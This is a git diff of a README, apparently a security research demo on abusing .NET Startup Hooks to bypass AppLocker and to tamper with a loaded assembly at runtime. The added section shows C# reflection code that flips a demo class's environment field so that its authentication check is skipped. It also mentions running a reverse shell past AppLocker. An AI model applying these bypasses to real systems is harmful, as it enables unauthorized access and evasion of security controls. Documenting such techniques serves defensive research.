@@ -10,8 +10,7 @@ More info regarding Startup Hooks can be seen [here](https://github.com/dotnet/r
 
 In this demo, we will focus on
 1. Bypassing Applocker to run Reverse Shell
-2. Bypassing Applocker to run any Binary
-3. Introspection and Modification of code or behaviour at Runtime
+2. Introspection and Modification of code or behaviour at Runtime
 
 
 # How to define a Startup Hook
@@ -183,3 +182,87 @@ Lastly we simply run our program.
 
 
 We have just bypassed Applocker!
+
+# Introspection and Modification of code or behaviour at Runtime
+
+The `Common Language Runtime` preloads all the assemblies needed by the main binary and our start up hook dlls. It then uses the `Main Thread` to execute the Startup hooks one after another. Only when all the hooks are run to complete, will the binary's `Main()` function be started. 
+
+Hence as our `StartupHook`'s `Initialize` method is being executed, the main binary's dll are all already loaded in the Application Context. We thus can tinker with it.
+
+Let's say we have an application called `MyApplication.exe`. Within it, there is a class called `VulnerableClass.cs`.
+
+For example,
+```cs
+namespace MyApplication
+{
+    public class VulnerableClass
+    {
+        public static string Environment = "Production";
+        public static string DefaultUsername = "Admin";
+        public static string DefaultPassword = "Password";
+
+        public bool Authenticate(string username, string password)
+        {
+            if (Environment == "Development")
+                return true;
+            else
+                return PerformAuthentication(username, password);
+        }
+
+        private bool PerformAuthentication(string username, string password)
+        {
+            return username == DefaultUsername && password == DefaultPassword;
+        }
+    }
+}
+```
+
+We can see that the class properly authenticates when the Environment is "Production" while it allows all kinds of username and password for the `Development` environment.
+
+With a startup hook, we can perform introspection of any loaded assemblies and even retrieve or change values.
+
+
+In our Main class, if we have the following code,
+
+```cs
+namespace CustomAppDomain{
+
+   public class Program
+    {
+        static void Main(string[] args)
+        {
+            bool isAuthenticated = new VulnerableClass().Authenticate("Razali", "Password");
+
+            Console.WriteLine($"Is Authenticated : {isAuthenticated}");
+            Console.Read();
+        }
+    }
+
+}
+```
+<img width="675" alt="image" src="https://user-images.githubusercontent.com/12537739/174953391-aa4dcb57-21db-4eb6-b3c0-6a78601f85bb.png">
+
+Our authentication fails as the username is supposed to be `Admin` and not `Razali`.
+
+However, we can use startup hooks to set the environment at runtime, to be a development environment and bypass the authentication procedure.
+
+```cs
+internal class StartupHook
+{
+    public static void Initialize()
+    {
+        Assembly.GetEntryAssembly()
+                .GetTypes()
+                .First(x => x.Name == "VulnerableClass")
+                .GetField("Environment")
+                .SetValue(null, "Development");
+    }
+
+}
+```
+
+After setting up the hook, we can see that we are authenticated.
+
+<img width="675" alt="image" src="https://user-images.githubusercontent.com/12537739/174954663-d2d496d7-c825-4782-8a3e-3c96caa81e4e.png">
+
+
